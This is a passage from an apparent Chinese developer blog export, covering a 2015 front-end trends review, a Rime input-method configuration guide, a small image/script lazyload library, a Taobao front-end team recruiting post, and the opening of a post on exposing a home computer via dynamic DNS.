函数等等。 复杂的业务中会经常看到一层又一层的回调处理，回调的嵌套让代码的可读性变的很差，而且很难将多个异步并行处理。为了改变这种编程范式，我们做了很多的思考，使用事件监听，使用各种手段拉直回调，平坦地调用。 慢慢的，如果你在关注 W3C 小组的动向，会发现，那些被认可的，并且被广泛重复定义的东西，都被纳入了标准。最开始的 jQuery/prototype，前者主要是对浏览器做兼容处理，让开发者不再把精力放到浏览器的差异上；后者是对语言本身的拓展，对 JavaScript 各种类型做拓展，并且提供了一套拓展任何对象的功能集。而现在的开发，我们很大程度上不再依托这些类库。规范和标准已经把这些差异都统一了，String 中自带了 includes/startsWith/endsWith/repeat/padStart/padEnd 等函数，Array 自带了 from/forEach/of/keys/values/find/findIndex 函数… 规范的标准是为了让开发者得到更好的编程体验，编程不是目标，目标是将编程生产力转化成实际效益，越少的阻碍对开发者越有利。各浏览器厂商当然也认识到了这一点，他们不断地提升自己产品的体验，将标准中的新特性都融合进去，比如 ES6 中的 Promise/Generator/Class/Module 等等。在这些内容普及之前，我们不需要加入 jQuery/prototype 这些「不纯粹」的东西，而是添加两个 shim 和 polyfill，如 es5-shim，html5shiv 等等。待到山花烂漫时，再轻松删掉这些补丁程序。 这两年工程化很热，W3C 小组也看到了，这就是市场的需求，为了完成一个大型应用的编程，就必须模块化、组件化，于是在规范中也出现了 Module &amp; Module Loader；Node.js 的到来，让很多前端工程师开始接触数据库操作，面对巨量的异步，我们忍气吞声写了无数的回调地狱，尽管使用了很多 Promise 相关的操作，程序结构依然松散难以阅读，于是规范中也开始出现了 async/await 等对 Generator 的上层封装。文字已经不能满足当代人的沟通需求，音视频等富媒体传输走进了我们的生活，于是规范中也出来了 WebRTC/WebAudio 等规范。 只要规范出来了，后续市面上就会根据规范来实现一套 shiv，这些 shiv 提供了同样的 API，提供了同样的编程体验。当浏览器自我进化完成之后，这些 shiv 也将成为历史，被开发者遗弃在代码的注释之中。这些都是规范和标准的魅力，它的存在，就是让开发者把精力投入到自己的业务之中，编程和范式的工作交给它。 在 这里 可以看到，W3C 各个小组最近都在干啥。标准不能囊括一切。 生态的自我完善和自我拓展技术的更迭过于频繁，我们能够清晰地看到，很多人还在用更迭前一波甚至是前好几波的产品。 当年的 IE6，在战场上鏖战了 10 多个年头，依然屹立不到，而现在它在市面上依然有百分之一左右的占有率，这种小强精神不得不让人肃然起敬。“只要用户在，我们就得追随”，这可能是很多公司的服务理念，因为用户就是潜在的利润。正是因为这种服务理念，成就了 IE6 一个又一个的 5 年！然而低本版的 IE 已经不仅仅是被前端从业人员抵制和排斥了，网络安全、网络运维、QA 等等，各个技术岗位的人员都开始对他不屑，它的存在对工作效率、对安全、对很多方面产生了极为不良的影响，甚至影响到一些核心内容的推广，所以 2016 将是低版本 IE 消亡的一年，我也呼吁业界所有的朋友举起义旗反抗起来！ 庆幸的是，也有人开始吃螃蟹了。从支付宝到天猫到淘宝，阿里巴巴在很多业务上已经主（bèi）动（bī）地放弃了对 IE6 和 IE7 的支持，甚至在统一接入层直接做了 302 跳转，提示用户更新浏览器或者引导流量到无线端。这是一个好的开始，我们期望这也是业界达成共识的开始！ HTTP 协议，从 1.0 快速过度到了 1.1，整个互联网的上层建筑变的十分稳固。当然，我也了解到依然有很多产品还是保持了 1.0 的状态，据说电信公司的很多产品就是使用 HTTP/1.0 进行通讯，这无疑让人惊愕。为了追求更高的效率，减少网络传输中的无效流量，W3C 工作组对 HTTP 协议也做了重新的定义，SPDY 就是 13 年比较火热的一个话题，Firefox 和 Chrome 都陆续开始支持 SPDY，后来在 SPDY 的基础上做了升级，正式定义为 HTTP/2.0，它的一个很大特点就是多路复用，这个小小的特点改变了我们前端编程的很多优化模式，比如 域名不是越多越好，为了能够充分利用浏览器的连接数，我们给 JS 和 CSS 开一个域名，给 img 开好几个域名，网页打开的时候，恰到好处的利用浏览器的连接数上限限制。HTTP/2.0 的多路复用，就是可以在一个 HTTP 请求中进行多个资源的传输，如果域名散列，反而不能利用这个特性 资源合并没有任何优势，以前的资源合并是为了减少请求数以节约建立 TCP 链接的网络开销和头部传输的流量开销，而在 HTTP/2.0 中，一个 HTTP 请求上完全可以把所有的资源全部推送过来，如果合并了资源，反而不能良好运用浏览器对资源的缓存。 当然，除了多路复用，还有很多其他的优化，比如传输的数据为二进制流，HEAD 头会被压缩处理，服务器可以向客户端推送内容等。在这个技术水平指数式增长的年代，我相信以后的革新不会比消灭 IE6 痛苦。 模块加载上，经过了各派系的争论之后，流传下来几个不错的产品 SeaJS、RequireJS 等，那么那个模块加载器将成为工具平台中短暂的终点呢？似乎这些都不是。当我们按照规范中的方式进行模块定义，按照规范中的方式加载定义的模块时，加载这个流程就显得不那么重要了，因为这些事情最后都会变成 shiv/polyfill 的事情，最终会变成浏览器的固有属性。 当一个东西在社区中被暴力追捧的时候，会有很多衍生的产品出来，当这些衍生物根深蒂固时，可能又会出现一个更加原生更加符合开发习惯的东西出来。就像 jQuery，我们为它编写的插件不计其数，而在工程化的需求冲击下，它却显得那么的弱不禁风，因为它关注的点和当前的发展态势不太吻合，仅此而已。 Mobile 的发展驱动着战场的转移记得当年拿着 Nokia5230 学完了 HTML 和 JavaScript 的入门，那屏幕尺寸也就是三个手指的宽度，紧紧攥在手里看着页面混排效果极差的网页文档。 现如今，iPhone 都出到 6s 了，一个版本一个尺寸，而且尺寸越来越大，还有各种宽高不一的 Android 机器，种类繁多。以前的触屏是电阻式，只支持单点触碰；而现在电容式的触屏精度更高，还支持多指触控，这如丝般顺滑的体验在三四年前是完全体会不到的。曾经手机开一个程序久了就会卡，动不动还会自动重启；而现在的手机开一堆程序，完全无感知，这就是硬件发展前后的差异。 手机已经成为了人们生活中不可或缺的一部分，甚至成为了一些人身体的一部分，淘宝今年双十一的数据显示，国内移动端的消费比例已经远远超过了 PC 端，占比 68%。面对庞大的用户，我们的技术是否做好了充足的准备，这里还得打一个问号。 PC 上那一套经验不是直接搬到移动端就可以使用了，在移动端还需要解决更多的问题： 多分辨率问题，这里涉及到了响应式设计和前端响应式技术 不同网络环境的网页加载优化问题，2g/3g/4g/wifi 手指交互带来的一系列体验问题 为了提升用户体验，将 Web Native 化 —— 类 React 技术带来的一系列问题 远程调试问题 移动安全问题等等 上面提到的问题很多已经有了优秀的解决方案，当然也有很多未提及的。WebApp 的性能、流畅度和稳定性远远不如原生应用，同时它也无法良好地运用设备提供的原生功能，这些都是大家转投 Native 的原因。 端的融合不同分辨率的手机，不同物理尺寸的终端，为了保持良好的视觉体验和用户体验，我们不得不为每一个尺寸写一份 Media Query 代码，那么对应的，设计师也需要设计多套版式供前端使用，这给设计师、前端和测试带来了无尽的麻烦。为此，我们通过前端技术重塑屏幕，重新定义像素尺寸，使用流式布局，通过百分比来响应不同的终端尺寸。这是端的融合。 后续的 Mobile 的技术发展方向上，应该是相当明确的。很多公司都是三套人马维护三端的程序，iOS、Android 和 Web，而这三端做的事情都是一样的，一样的界面，一样的后端接口，一样的交互方式。为了能够快速响应业务的变更，我们不得不将三端合并为一端对待，用一套程序编程成三端代码，然后发布到三个平台上。这也是端的融合。React 系列技术发展到此，绝对不是终点，它只是一个探路灯，给我们照明了方向。 技术需要为业务做保障，而好的技术是能够及时响应业务的变化，我们不可能投入大量的人力在 Web 的修补工作上，通过开发统一工具，屏蔽端和端之间的差异，统一开发模式和开发体验，这才是 Mobile 的未来。 当然，回到我们之前说的规范和标准，我们目前所做的「屏蔽差异」工作，今后，也会有统一的标准来规范，目前手机厂商没有这个共识，是因为还处于当年 Chrome、Firefox 抢占 IE6 市场份额的阶段。端的最终融合在于一个统一的标准，以及强有力的执行。 栈的融合我刚接触前端的时候，还没有听说「全栈」，Web 技术栈往小里说，包含了从前端设计、交互、前端实现、网络数据传输、后端实现、后端运维和数据库等几个方面，能短时间内从无到有实现这么一套系统，并且能够抗得住一定流量冲击的人，我们可以称之为全栈工程师。能够有架构有条理地实现这套系统，并且抗得住大流量、有集成测试、有监控的，这种我们可以称之为资深全栈工程师。现在不乏这种人才，也不乏自吹为这种人。 栈的融合得益于 Node.js 的出现，作为前后端分离的桥梁，它拉近了前端工程师与后端的距离，有的人在这座桥梁上卖力行走，渐渐的也从前端走进 了后端，甚至走进了后端的运维。至此，前端也拥有了部署和发布整个应用的能力，这是一个质的突破。 使用 Node.js，简单几行程序便能实现一个 web 服务器、便能搭建一个多人聊天的网页，它的便捷性可见一斑。NPM 社区的发展，沉淀了成千上万的组件包，一行命令即可获取，这种组件拼凑式的开发，任何功能的实现都不会显得太复杂，而这里的「不复杂」也蕴含了无数的坑坑洼洼，在这一层的融合上也会遇上不少阻碍： 冗余的庞大的包内容，为了使用一个小功能，我们从网络上拉取下来一个巨大的包，而且这里的「巨大」对很多人来说都是无感知的，很少会有人进入 node_modules 去查看依赖的第三方包是如何实现的，实际情况可能会相当震撼，第三方包还引用了一堆第三方包，这些包都会在 Node.js 执行的时候被收纳进去，放在内存中。 猛烈的迭代，今年的 Node.js 被人嫌弃迭代太慢了（当然，这是表面原因），走出了一个分支 io.js，发展了一会儿，进度赶超了 Node.js，后来觉得一家人不干两家活，又合并回去了。虽说上层 API 几乎没有变化，但是底层却被翻了一个天。 偶尔的巨大漏洞，每隔一端时间就会暴露 Node.js 存在漏洞，这些漏洞的补救措施就是立即升级版本号，比较让人担心受怕。 后端意识不强烈，前端占领了中间层的开发，有的时候还干这后端的活儿，然而却没有后端沉淀多年固有的意识，测试和监控做的相当潦草。 JavaScript 从客户端的脚本语言纵身跃进进入了后端行列，而今也开始深入到移动端 Native 领域，确实是无孔不入，这可能就是语言的特性，也可能是技术本身就在寻求融合点，把有差异的地方全部躺平，然后用统一的方式去关注业务，关注用户。端和栈也在融合。 后端服务化，云数据，云安全用户体验变得越来越重要，响应式技术的发展也是后续网页应用的一大特点，端和端之间的差异只是在表现上，数据这一层差异不是特别大，很多应用 PC 和 Mobile 共用一套接口，或者 Mobile 的接口在 PC 接口的基础上做了一层包装，对接口字段做了些许删减。后端为了响应各个端之间的数据需求，也需要关注数据的可利用性，接口包装的拓展性等，这是后端服务化的一个表现。移动端的开发上，前后端间隙十分明显，越来越多移动端应用的发布已经脱离了后端，前端完全通过异步方式获取数据。 业务变化很快很快快，今天这个产品被并购，明天那个业务被砍掉，每个人负责的业务线可能冷不丁地就变了。很多大公司的决策是由上往下的，上面微动，下面可能就是大动，可能某个部门就不存在了，也可能被划分成几个产品部门。 所以「大后台，小前台」的趋势必然形成。前端，毫无疑问，在这个前台之中。前台的特点是灵活的，多变的，可快速重组的。对后台而言，为了响应前台的变化，需要提供更细粒化的 API，将数据打散，打得更加零碎，零碎的数据易于重组，这是在考验后端的架构能力。如今，很多前端也都是半栈工程师，盘踞在前后端中间层上，然而如何迎接这种后端服务化的模式，似乎这个准备还是不够充足的。 GraphQL 的出现场景跟 React 类似，React 是前端应对不同场景的一种强有力手段，而 GraphQL 则是后端应对不同需求场景的一次尝试，Web APIs 将会成为 Web App 和 Mobile App 的一个中心点，前端基于后端的 RESTful 服务构建应用，这里面存在太多未知的问题需要探索，这是一个大数据下探索的新起点，也给前端开发者创造了无数的可能。 这几年各类网盘，各个云服务商都在抢占市场，有提供图片储存的，有提供 CDN 静态资源缓存的，有提供大文件储存的，也有卖数据库服务的。种类繁多，而归根到底都是，你付钱给我，我提供储存和安全，还提供方便的 SDK 让你获取自己的数据。云服务卖的是一套服务，它是把所有人的数据风险集于一身，用强硬的技术做安全防御。云，赋予了我们无穷的想象空间。 三辆马车，我们还差一辆开发功能对很多人来说是轻松活儿，基本的前端语言加些复杂的特效，实现成本不会很高；即便是搭建一个网站，使用 Node.js 社区中的框架也能够轻松实现。然后极少人会去关注每个功能点的测试，一个项目下来基本看不到测试用例，更不用说会去做监控相关的事情。结果就是，踏过了无数的坑洼之后终于上线了，而后续加功能的时候发现，加了东西就跑不通，新内容影响了之前的逻辑，只好去修复之前的逻辑，修好之后发现更早之前的逻辑又不通了，整个修复过程就像玩多米诺骨牌。 程序开发三板斧：功能、测试和监控。在 github 上可以看到很多程序都加入了持续集成，这是一个好兆头，意味着我们写的程序也越来越健壮，至少贡献给世人使用的程序是健壮的。很多程序的代码覆盖率也达到了 90%+，这些数据都是重视测试的证据。 然而，三辆马车，我们最后一辆依然没有开动起来。很多公司都会有自己的 log 平台，每个用户访问页面中的任何一个链接都会将用户信息和访问信息以 log 日志形式收集到 log 平台上，然后通过监控平台或者离线分析的方式，获取业务数据或者技术数据，进行分析和二次开发。这些东西在大公司见的很多，而这方面的东西在前端，尤其是使用 Node.js 做程序开发的前端身上，看到的并不多。 最后2016 年，我觉得技术上的新创造会稍微缓和些，这两年很多人已经被新技术冲击得有些找不着方向了，同一类东西，前者还没学完，后者就开始火爆了，紧接着又是一阵技术的凋零和新技术的出现，这样搞久了也会有一丝的疲倦。而更多的会关注，如何更好地服务多端，如何更大幅度地提升开发体验和用户体验，很多技术都会往性能、往极致这个方向上钻研。 写长文真不轻松。写到这里，感觉说的不通透，还有很多想说的，但是个人理解力有限，也难以表达全面。技术的变化很快，今天说过的东西，到了明天就可能过时了。我们猜不透未来，只能把现有的东西好好消化吸收下，留下一个话柄，给读者吧。 参考资料 http://hikejun.com/blog/2010/02/08/2009年前端技术领域回顾/ By 张克军 http://www.infoq.com/cn/news/2011/01/infoq-2010-front-end-sum by 崔康 http://developer.51cto.com/art/201112/307846.htm by 七武海 http://www.csdn.net/article/1970-01-01/2815164 By 李晶 http://cnberg.com/archive/2013-fe/ By Berg http://www.infoq.com/cn/articles/2014-review-front-end-part By 黄丹 http://medium.com/@shijuvar/web-development-trends-for-2015-and-beyond-c2d3c1ef5718 By Shiju Varghese http://github.com/kuitos/kuitos.github.io/issues/32 By Kuitos]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>网络技术</category>
      </categories>
      <tags>
        <tag>技术前瞻</tag>
        <tag>前端发展</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[换新的输入法，Rime]]></title>
    <url>%2Fblog%2F2015%2F11%2F20%2F2015-11-20-new-input-methed-rime%2F</url>
    <content type="text"><![CDATA[使用 Mac 快两年时间了，码字错误率提高了 200%。国内两款输入法 百度／搜狗，其实都挺好用的，但是有几个毛病： 不流畅，有的时候感觉跟不上我的速度 在部分软件内输入存在问题，卡死或者 CPU 飙高 半角全角不好控制 因为百度输入法在 xx 编辑软件内会 loading 甚至死掉，而且联想功能和自动纠错功能太弱，我换成了搜狗，最近搜狗输入法一个 bug 把我郁闷死了： 反馈给他们的技术人员，但是目前也没看到新版本更新，恰巧看到同事使用一款从来没见过的输入法，网上搜索了一番，感觉挺不错。 这块输入法的名字叫做 Rime，中文名为：鼠须管（它有好几个名字，Windows 下叫做小狼毫），我用的是 Mac，就没有去研究 windows/Linux 下的 Rime 了，你能想到的输入法，它都支持，兼顾 windows/Linux/Mac 三大系统。 关于 Rime网上搜索最先看到的时两篇文章，一篇是 爱范儿 对它的介绍，另一篇是 BYVoid 对它的赞扬，称之为「神级输入法」。 这个输入法是“佛振”开发的，我不了解这个人，但是从 Github 上可以看到他的一些项目，应该是个低调的大牛。 Rime 的官网地址：http://rime.im/。听同事说，他使用 Rime 的时候还没有官网，之前是在 google code 上下载安装的。官网几个大字屹立：“聪明的输入法懂我的心意”。作者的编程思想是： 技巧加蛮力 慢工出细活 创造艺术和美 登峰造极之作 很有雅韵，不过「慢工出细活」这句话估计也是无奈之语，因为这东西的开发人力投入并不多，一两个人搞，还得兼顾这么多平台，自然就慢。很多人评论说 Rime 流畅、丝滑，怎么说呢，Rime 的词库不多，它的哲学也不提倡导入太多的词库，期望用户根据自己的输入习惯自然形成个性化的词库。这是它快的原因之一，不像搜狗输入法，安装的时候就给用户安装、导入一堆东西，检索的时候自然也就慢了。 安装和使用如果你是一位 Mac 用户，电脑上应该已经安装了 Homebrew 了吧，如果已经安装了 Homebrew，不妨再安装一个 Homebrew Cask，它打包了很多软件，可以一个命令完成一个软件的安装和配置，比如安装 Rime： 1$ brew cask install squirrel 我建议你把墙打开，我试过，不翻过墙，安装的速度是 0. 安装好了之后，你只需要关注一个目录：~/Library/Rime，这个目录下容纳了很多东西，包括接下来你需要配置的。 如果你没有安装 Homebrew，请移步 这里，或者自行 google。 当你完成上述操作之后，我建议你先进入 系统偏好设置-&gt;键盘-&gt;输入源，把 鼠须管 和 默认ABC 之外的输入法先删除，因为你已经不需要它了，就像我这样： 在我们上面提到的目录中，有很多东西，看着会有点头晕： 但是可以清晰的看到有好几组，分别是 cangjie5（仓颉拼音）、double_pinyin_flypy（双拼）、luna_pinyin（朙月拼音）、luna_pinyin_simp（朙月拼音简体）等等。大多数人需要关注的是 squirrel.custom.yaml（输入法皮肤配置） 以及 default.custom.yaml（输入法引擎配置）这两个文件。 我觉得你没太多必要了解这些配置的细节内容，将下面代码复制进去，然后部署下。 123456789101112131415161718192021222324252627# default.custom.yaml, 全局生效patch: menu/page_size: 9 #这是之前增加的候选词数量。 schema_list: #“输入选单”中激活的输入方案定义。 # - schema: terra_pinyin - schema: luna_pinyin - schema: emoji # - schema: luna_pinyin_fluency # - schema: double_pinyin_mspy - schema: luna_pinyin_simp # - schema: bopomofo # - schema: double_pinyin_flypy#下面定义“输入选单”的切换控 switcher: abbreviate_options: true caption: &quot;〔切换输入方案〕&quot; #把默认的“方案選單”修改为了“切换”。 fold_options: true hotkeys: - &quot;Control+grave&quot; #默认方案 - &quot;Control+Shift+grave&quot; #默认方案 - &quot;Control+s&quot; #新增方案 option_list_separator: &quot;／&quot; #以下都为默认custom.yaml文件的默认配置，copy过来就可以。 save_options: - full_shape - ascii_punct - simplification - extended_charset 12345678910111213141516171819202122232425262728293031# 适用于【鼠须管】0.9.13+# 位置：~/Library/Rime/squirrel.custom.yaml# 用法：想要哪项生效，就删去该行行首的 &quot;#&quot; 字符，但注意保留用于缩进的空格patch:# us_keyboard_layout: true # 键盘选项：应用美式键盘布局# 状态通知，适当，也可设为全开（always）全关（never）# show_notifications_when: appropriate# style/color_scheme: lost_temple # 选择配色方案 style/horizontal: true # 候选窗横向显示 style/inline_preedit: false # 关闭内嵌编码，这样就可以显示首行的拼音# style/corner_radius: 10 # 窗口圆角半径# style/border_height: 0 # 窗口边界高度，大于圆角半径才有效果# style/border_width: 0 # 窗口边界宽度，大于圆角半径才有效果# style/line_spacing: 1 # 候选词的行间距# style/spacing: 5 # 在非内嵌编码模式下，预编辑和候选词之间的间距# style/font_face: &quot;Hiragino Sans GB W3&quot; # 字体名称 style/font_point: 28 # 字号# 注：预设的配色方案及代码（指定为 style/color_scheme ）# 碧水 - aqua# 青天 - azure# 明月 - luna# 墨池 - ink# 孤寺 - lost_temple# 暗堂 - dark_temple# 星际我争霸 - starcraft# 谷歌 - google# 晒经石 - solarized_rock# 简约白 - clean_white yaml 配置简洁易懂，而且还有注释说明，相信聪明的你可以自己尝试微调。以上修改完成之后，需要部署（相当于修改了配置之后需要重新编译一次）。 部署有两种方式：在顶部 toolbar 中找到输入法按钮点开后的「重新部署」选项；或者按下 Ctrl + alt + ~ 组合键。 如果你需要输入 emoji 或者刚开始安装切换到简体输入法（安装后默认为繁体），你需要按下组合键 Ctrl + ~，这里需要注意的是 Sublime Text 的快捷键跟切换输入引擎组合键冲突了，建议 focus 到其他窗口再按组合键，不过在我们上面部署完了之后会解决这个问题，因为我们在 default.custom.yaml 配置了其他的 HotKeys，可以通过 Ctrl + s 和 Ctrl + Shift + ~ 进行切换操作。 小 Tip 如果你期望快速输入 emoji，比如输入 cry 就会出现哭的表情，可以这么干： 在你目前使用的输入法对应的自定义配置项中配置如下内容（我用的是简体输入，对应的是 luna_pinyin_simp.custom.yaml） 12345678910111213141516# luna_pinyin_simp.custom.yamlpatch: engine/translators: - punct_translator - r10n_translator - reverse_lookup_translator recognizer/patterns/reverse_lookup: &quot;`[a-z]*$&quot; schema/dependencies: - emoji abc_segmentor/extra_tags: - reverse_lookup reverse_lookup: dictionary: emoji enable_completion: false prefix: &quot;`&quot; tips: 〔表情〕 它的作用是，当你按下 “`“ 这个符号的时候，会进入 emoji 的输入模式，或者平时随意输入的时候也会偶尔出现 emoji。我把这个配置项删掉了，原因是，当我输入一个字符，比如 “l” 的时候，我期望第一个出现的是 “了”，然而它确实 emoji，而且整排选项都是，如下图： 小结如果你是一个资深爱折腾玩家，建议阅读这两篇文章： 安装及配置 Mac 上的 Rime 输入法——鼠鬚管 (Squirrel) Rime输入法—鼠须管(Squirrel)词库添加及配置 当然，可以直奔官网的说明：http://github.com/rime/home/wiki。 我用了两天，感觉很棒。我的皮肤设置（squirrel.custom.yaml）为： 12345678910111213141516171819202122232425262728293031# squirrel.custom.yamlpatch: # us_keyboard_layout: true # 键盘选项：应用美式键盘布局 # show_notifications_when: growl_is_running # 狀態通知，默認裝有Growl時顯示，也可設爲全開（always）全關（never） style/color_scheme: demo # 选择配色方案 style/horizontal: true # 候选窗横向显示 # style/inline_preedit: false # 关闭内嵌编码，这样就可以显示首行的拼音（MAC下不建议开启） style/corner_radius: 3 # 窗口圆角半径 style/border_height: 4 # 窗口边界高度，大于圆角半径才有效果 tyle/border_width: 4 # 窗口边界宽度，大于圆角半径才有效果 # style/line_spacing: 1 # 候选词的行间距 # style/spacing: 5 # 在非内嵌编码模式下，预编辑和候选词之间的间距 style/font_face: &quot;Lantinghei TC Extralight&quot; # 预选栏文字字体，使用中文字体：兰亭黑-纤黑 style/font_point: 17 #预选栏文字字号 style/label_font_face: &quot;Myriad Pro Light&quot; # 预选栏编号字体，使用西文字体：Myriad Pro Light style/label_font_point: 17 #预选栏编号字号 #上述是候选栏的基本设置，确定了文字的大小和候选栏的外观样式。 #下面是“demo”样式文件的配置，主要确定候选栏颜色配置。 preset_color_schemes: demo: #样式名称，就是上述“style/color_scheme: demo” author: &quot;Barret Lee &lt;barret.china@gmail.com&gt;&quot; #作者 name: &quot;小胡子哥&quot; #作者名字 label_color: 0xf2a45a #预选栏编号颜色 back_color: 0x333333 #背景颜色 candidate_text_color: 0xb9b9b9 #非第一后选项文字颜色 comment_text_color: 0xa5a5a5 #注解文字颜色 hilited_candidate_back_color: 0x333333 #第一后选项背景颜色 hilited_candidate_text_color: 0xff7d00 #第一后选项文字颜色 hilited_comment_text_color: 0x00a5ea #注解文字高亮 hilited_text_color: 0x7fffff #拼音串高亮（需要开启内嵌编码） text_color: 0xa5a5a5 #拼音串颜色（需要开启内嵌编码） 效果是这样： 好吧，希望你能玩的愉快。 P.S: 这篇文章我没有复查，应该没太多错别字 ；）]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Rime</tag>
        <tag>鼠须管</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片脚本懒加载 - Lazyload]]></title>
    <url>%2Fblog%2F2015%2F11%2F16%2F2015-11-16-lazyload-component%2F</url>
    <content type="text"><![CDATA[注：代码有更新，细节以 github 的 README 说明为准。 写了一个轻巧的小程序 - Lazyload，100 行代码。加上一个 data-src 属性，能够让页面中的图片懒加载、textarea 中的脚本懒执行，有需要的可以拿过去用用，代码逻辑比较简单，也可以自己增强点功能，比如动态添加懒加载监听等等。 仓库地址：http://github.com/barretlee/lazyload Demo地址：http://barretlee.github.io/lazyload/demo/index.html 核心代码： 1234567891011121314Lazyload.prototype._detectElementIfInScreen = function() &#123; if(!this.elements.length) return; for (var i = 0, len = this.elements.length; i &lt; len; i++) &#123; var ele = this.elements[i]; var rect = ele.getBoundingClientRect(); if(rect.top &gt;= Lazyload.DISTANCE &amp;&amp; rect.left &gt;= Lazyload.DISTANCE &amp;&amp; rect.top &lt;= (window.innerHeight || document.documentElement.clientHeight) &amp;&amp; rect.left &lt;= (window.innerWidth || document.documentElement.clientWidth)) &#123; this.loadItem(ele, i); this.elements.splice(i, 1); i--; len--; &#125; &#125;&#125;; 这里主要用到了 getBoundingClientRect 这个函数，兼容性没话说，IE6 都兼容，他的作用是获取元素距离视窗上下左右的距离： 配置了两个参数： Lazyload.TAG，默认是 “data-src” Lazyload.DISTANCE，可以设置元素提前多少像素加载，默认是 0，即进入视窗便加载。 使用方式： 12345678&lt;script src=&quot;//raw.githubusercontent.com/barretlee/lazyload/master/index.js&quot;&gt;&lt;/script&gt;&lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;item&quot;&gt;&lt;img src data-src=&quot;img-path&quot;&gt;&lt;/div&gt; &lt;div class=&quot;item&quot;&gt;&lt;textarea&gt;alert(1)&lt;/textarea&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;new Lazyload(&quot;.box .item&quot;)&lt;/script&gt; 请轻点拍砖；）]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>lazyload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[淘宝 UED 前端团队究竟好不好？值得去吗？]]></title>
    <url>%2Fblog%2F2015%2F11%2F13%2F2015-11-13-taobao-fed-come-on%2F</url>
    <content type="text"><![CDATA[在知乎上回答了一个问题：『淘宝 UED前端团队究竟好不好？值得去吗？』 这个问题好像有三年多了，那个时候我还在大二，刚接触前端，对这行也不是很了解。经过这几年的技术改造，尤其是现在也是淘宝前端团队一员，还是想说两句。 现在没有淘宝UED了，之前淘宝网的前端团队从属于用户体验部，现在分离出来并到了淘宝技术部，更名为『淘宝前端团队（Taobao FED）』，我们的官网地址：http://taobaofed.org 。风驰、小马等也分别去了阿里云和技术保障部。（前端需求是很大的，具备领导者素养的，集团也会平均分配，从个人的发展角度，离开淘宝前端团队转岗其他团队也是明智之举嘛~） 双十一的交易额，从 12 年到 15 年，三年间可以说翻了好几倍。这些数据的背后除了因为中国经济 的迅速发展、互联网的迅猛崛起外，更少不了我们这些技术人在背后 支持。 业务和技术都在发展，对优秀人才的招募也是从未 停止。从国内前端团队的规模来看，应该没有 哪个公司的前端团队的人数比淘宝前端团队多。 要想让一个规模巨大的前端团队良好运作起来，我们开发了很多系统、筑起了很多的平台，每一个系统、每一个平台都值得你过来了解和学习，而这些就足够你学习一到两年时间，更不用说我们每周、每月多次的团队交流、跨团队交流以及丰富多彩的团队技术竞技。 刚过来的同学都会经过一次团队的洗礼，以前会有一些所谓的『比较黄』的破冰，我就经历过，当时确实十分尴尬，但是经历之后，回味起来，也会不禁撇一撇嘴角，微微一笑。而现在我们的破冰更加自然，你会发现，不管是你的师兄师姐，还是 leader/boss，他们就是你的普通同事。我发现最近比较多的乐趣都是挑逗 boss，这就是我们团队的生活，简单而又不简单。 有人吐槽过，阿里的绩效考核制度，3.25/3.75，对此，我觉得没啥好评价的，如果你是一个管理者，或者学习过管理学相关的知识，然后多看看知乎上其他关于制度考核的帖子，你会发现，阿里十多年的管理经验积累不是吹的！在这里，只要你有点子，你就有机会；只要你肯努力，你就是团队中一颗闪亮的星！ 很多刚毕业的同学，可能跟我差不多，手里头有好几个大公司的 offer，然后开始纠结，到底去哪里好呢，百度、腾讯还是阿里巴巴。我实习是在北京百度，由于我的饮食口味略重，而刚好又没在百度总部（当时在奎科大厦），那伙食，真尼玛不能吃啊！那个时候，百度的主管跟我说，表现不错，给我 special offer，希望可以留下来，我犹豫了很久，但是来到淘宝之后，我已经没有任何犹豫了。 阿里巴巴西溪园区，8 幢大楼林立，中间一个池塘，每天路过能够听到鸭子嘎嘎嘎的声音。伙食真心不用说啊，我来了半年，胖了十斤…这里的食堂个数一只手的手指头根本数不过来，我不想继续形容，如果你在犹豫，可以来阿里西溪园区，我请客，带你逛逛。 不过，我也听到了一个可笑的声音，『西溪的环境太好了，我觉得太安逸，所以选择其他公司』。我想，很多人在面试的时候被 HR 问过，你怎么看待加班这个问题吧。难道你觉得一个有机会让你加班的公司会很安逸？如果你可以把自己定位得高一点，你永远都不会觉得安逸。安逸来自于内心，而不是环境。 现如今，互联网的形式有些波动，两家联姻， 却又被 BAT 收购；跳槽到东家，结果被老东家又收了回去。跳槽并没有你们道听途说的那么频繁，反倒是大公司招人却越来越难，因为前端发展这么快，门槛也会越来越高，自然金字塔上层的人的比例就会越来越小。 好吧，说了这么多，还是得按照套路出牌，如果你对淘宝前端团队感兴趣，请联系我： Email： barret.china(at)gmail.com 微博私信：http://weibo.com/173248656 关于小胡子哥。]]></content>
      <categories>
        <category>随笔</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>淘宝前端团队</tag>
        <tag>Taobao FED</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[将你家里的电脑连上广域网]]></title>
    <url>%2Fblog%2F2015%2F11%2F07%2F2015-11-07-put-your-computer-to-internet%2F</url>
    <content type="text"><![CDATA[很多人买电脑半年一年之后，都会遇到这样一个问题：硬盘已经装不下？尤其是有些爱折腾的朋友喜欢安装多个系统，或者爱把各种美剧批量下载到本地，渐渐地，也只好去网上搜罗个硬盘。现在四五百就能买到一个 1TB 的硬盘，也不算很贵，可是电脑边上总挂着一坨东西，不仅不方便也不好看。 有同事给我推荐 NAS，我觉得是相当不错的一个方案，包括硬盘在内，一般用户配置可以控制在 2000-5000 人民币。喜欢折腾的也可以考虑 GEN8，价格在 1500-3000 人民币，得自己搞系统，NAS 对小白用户很和谐的地方是，DMZ 有一个中央系统，并且提供了 Web 控制界面，相当于以 NAS 硬盘作为储存中心，WebOS 上操作。 如果我选了 NAS/GEN8 估计也不会写这篇文章了。既然家里有闲置的电脑，而自己也有硬盘，就没有必要再去购买其他网络设备搭建远程操控环境了~ 解决 DDNS 的问题能够从万千网络中定位一台机器，估计也就只有 IP 了，家里安装的是电信的宽带，不像教育网分配了固定的网段，电信这种拨号方式上网的方式每次分配到的 IP 是动态变化的。为了能够拿到 IP，我们必须把变化的 IP 存在一个位置去，有三种方案： 如果你有一台服务器（如阿里云主机），你可以将本地 IP 每隔一分钟告知云主机，让与主机记住 IP 地址 